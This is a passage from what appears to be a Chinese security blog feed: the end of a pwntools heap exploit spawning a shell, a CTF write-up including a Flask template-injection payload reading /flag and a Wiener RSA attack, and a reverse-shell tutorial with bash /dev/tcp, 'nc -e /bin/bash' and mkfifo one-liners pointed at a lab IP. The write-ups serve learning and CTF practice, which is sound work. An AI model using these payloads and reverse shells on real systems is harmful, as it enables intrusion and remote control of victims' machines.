class="string">b'1'</span>)</span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfputs)+p32(read_got))</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">pfread = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">pfsys = pfread - <span class="number">0xd41c0</span> + <span class="number">0x3a940</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">delete_note(<span class="string">b'2'</span>)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">add_note(<span class="string">b'8'</span>,p32(pfsys)+<span class="string">b"||sh"</span>)</span><br><span class="line">print_note(<span class="string">b'0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​       </p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;p&gt;纯零基础，大佬请略过&lt;/p&gt;
&lt;p&gt;从零开始学习PWN,Web会去学，但可能现在大部分时间会用在</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>CUMT2020华为杯</title>
    <link href="https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/"/>
    <id>https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/</id>
    <published>2020-10-24T09:53:38.000Z</published>
    <updated>2020-11-20T14:18:17.449Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="CUMT华为杯"><a href="#CUMT华为杯" class="headerlink" title="CUMT华为杯"></a>CUMT华为杯</h1><p>web狗活成了各方向签到手…</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12摇奖得flag</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>四元一次方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>维吉尼亚密码，上网down脚本，猜密钥，跑出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure><h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>大数e</p><p>可以判断是wiener attack</p><p>上网直接down脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the key</span><br><span class="line">        if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0:</span><br><span class="line">            phi &#x3D; (e*d-1)&#x2F;&#x2F;k</span><br><span class="line">            s &#x3D; n - phi + 1</span><br><span class="line">            # check if the equation x^2 - s*x + n &#x3D; 0</span><br><span class="line">            # has integer roots</span><br><span class="line">            discr &#x3D; s*s - 4*n</span><br><span class="line">            if(discr&gt;&#x3D;0):</span><br><span class="line">                t &#x3D; Arithmetic.is_perfect_square(discr)</span><br><span class="line">                if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0:</span><br><span class="line">                    print(&quot;Hacked!&quot;)</span><br><span class="line">                    return d</span><br><span class="line"></span><br><span class="line"># TEST functions</span><br><span class="line"></span><br><span class="line">def test_hack_RSA():</span><br><span class="line">    print(&quot;Testing Wiener Attack&quot;)</span><br><span class="line">    times &#x3D; 5</span><br><span class="line">    </span><br><span class="line">    while(times&gt;0):</span><br><span class="line">        e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024)</span><br><span class="line">        print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;)</span><br><span class="line">        print(&quot;d &#x3D; &quot;, d)</span><br><span class="line">    </span><br><span class="line">        hacked_d &#x3D; hack_RSA(e, n)</span><br><span class="line">    </span><br><span class="line">        if d &#x3D;&#x3D; hacked_d:</span><br><span class="line">            print(&quot;Hack WORKED!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;Hack FAILED&quot;)</span><br><span class="line">        </span><br><span class="line">        print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d)</span><br><span class="line">        print(&quot;-------------------------&quot;)</span><br><span class="line">        times -&#x3D; 1</span><br><span class="line">    </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">    e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line">    c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span><br><span class="line">    #test_is_perfect_square()</span><br><span class="line">    d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895</span><br><span class="line">    m &#x3D; pow(c,d,n)</span><br><span class="line">    def num2str(num):</span><br><span class="line">        tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">        if(len(tmp))%2 &#x3D;&#x3D;0:</span><br><span class="line">            return tmp.decode(&quot;hex&quot;)</span><br><span class="line">        else:</span><br><span class="line">            return (&quot;0&quot;+tmp).decode(&quot;hex&quot;)</span><br><span class="line">    print(num2str(m))</span><br><span class="line">    #print(&quot;-------------------------&quot;)</span><br><span class="line">    #print(hack_RSA(e,n))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>转base64在转brainfk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125;</span><br></pre></td></tr></table></figure><h2 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h2><p>http流base64解码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;WirRSharK_S0_E45y&#125;</span><br></pre></td></tr></table></figure><h2 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h2><p>LSB隐写</p><p>red green blue 0 0 0</p><p>保存得二维码 扫得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;1sb_i4_s0_Ea4y&#125;</span><br></pre></td></tr></table></figure><h2 id="出个伪web吧"><a href="#出个伪web吧" class="headerlink" title="出个伪web吧"></a>出个伪web吧</h2><p>查看最新修改文件的时间</p><p>可以看到pass中有明显字符串cumt</p><p>然后拿flag包裹就行</p><h2 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h2><p>隐藏文字</p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img imageinfo</span><br><span class="line">python vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag</span><br></pre></td></tr></table></figure><p>可以看到有flag.png，输出一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900</span><br></pre></td></tr></table></figure><p>可以看到一个图片扫一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br></pre></td></tr></table></figure><p>解不出来</p><p>查看系统窗口列表，看有没有和flag有关的程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag</span><br></pre></td></tr></table></figure><p>可以看到有一个程序dump一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992</span><br></pre></td></tr></table></figure><p>用foremost分离一下</p><p>可以看到有图片</p><p>有key值和vi 然后就是AES加密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key:Th1s_1s_K3y00000</span><br><span class="line">vi:1234567890123456</span><br><span class="line">base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</span><br><span class="line"></span><br><span class="line">flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</span><br></pre></td></tr></table></figure><h2 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h2><p>010打开之后发现有secret.png没有伪加密，很明显子块被修改</p><p>7a改成74</p><p>分离出secret.png</p><p>发现是一张图片，但有两帧</p><p>脱到steg里面可以看到两个残缺的二维码</p><p>补全，就可以看到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;yanji4n_bu_we1shi&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CUMT华为杯&quot;&gt;&lt;a href=&quot;#CUMT华为杯&quot; class=&quot;headerlink&quot; title=&quot;CUMT华为杯&quot;&gt;&lt;/a&gt;CUMT华为杯&lt;/h1&gt;&lt;p&gt;web狗活成了各方向签到手…&lt;/p&gt;
&lt;h1 id=&quot;web&quot;&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://pz1o.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="题解" scheme="https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell总结</title>
    <link href="https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/"/>
    <id>https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</id>
    <published>2020-10-03T05:45:01.000Z</published>
    <updated>2020-11-20T14:19:35.452Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近遇到反弹shell，总结一下反弹shell，用来做笔记</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>反向Shell指Shell回弹或者叫反射，就是说受害者kali把自己的Shell挂载（或者叫attach更合适）到某个端口上，以此暴露到攻击者win可以连接的位置，攻击者win通过连接该端口最终拿到shell。</p><p><strong>以下实验都为</strong></p><p><strong>kali为被攻击者来模仿服务器</strong></p><p><strong>win为攻击者</strong></p><p>kali（服务端）：192.168.202.129</p><p>win（客户端）：169.254.158.23</p><h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a><strong>bash反弹shell</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>bash产生了一个交互环境让本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a><strong>实验</strong></h3><p>首先在win上监听8080端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 8080</span><br></pre></td></tr></table></figure><blockquote><p>-n: 不反向解析dns，即不通过ip解析域名 no dns</p><p>-v: 详细信息输出 verbose</p><p>-l:  监听 listen</p><p>-p: 指定端口 port</p></blockquote><p>然后再kali上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>之后反弹成功</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205548782.png" alt="image-20201002205548782"></p><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>具体各参数的意义</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002205958997.png" alt="image-20201002205958997"></p><p><strong>linux文件描述符</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - stdin 代表标准输入,使用&lt;或&lt;&lt;</span><br><span class="line">1 - stdout 代表标准输出,使用&gt;或&gt;&gt;</span><br><span class="line">2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>>&amp;</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</span><br><span class="line">当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&amp;和&gt;的区别</span></span><br><span class="line">root@kali:/var/www/html# ls  //查看无1.php</span><br><span class="line">flag.php  index.php</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;1  //将错误内容输入到1文件中</span><br><span class="line">root@kali:/var/www/html# cat 1</span><br><span class="line">cat: 1.php: 没有那个文件或目录</span><br><span class="line">root@kali:/var/www/html# cat 1.php 2&gt;&amp;1  //将错误内容按标准输出出来</span><br><span class="line">cat: 1.php: 没有那个文件或目录</span><br></pre></td></tr></table></figure><ol><li>bash -i 产生一个bash环境</li><li><code>/dev/tcp/ip/port</code>： <code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上<code>/dev/tcp/ip/port</code>这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出。</li><li><code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</li></ol><h2 id="nc一句话反弹"><a href="#nc一句话反弹" class="headerlink" title="nc一句话反弹"></a>nc一句话反弹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><blockquote><p>-e: 指定nc连接成功后执行的程序</p></blockquote><p>无-e的情况下可以执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f;</span><br></pre></td></tr></table></figure><h3 id="实验1"><a href="#实验1" 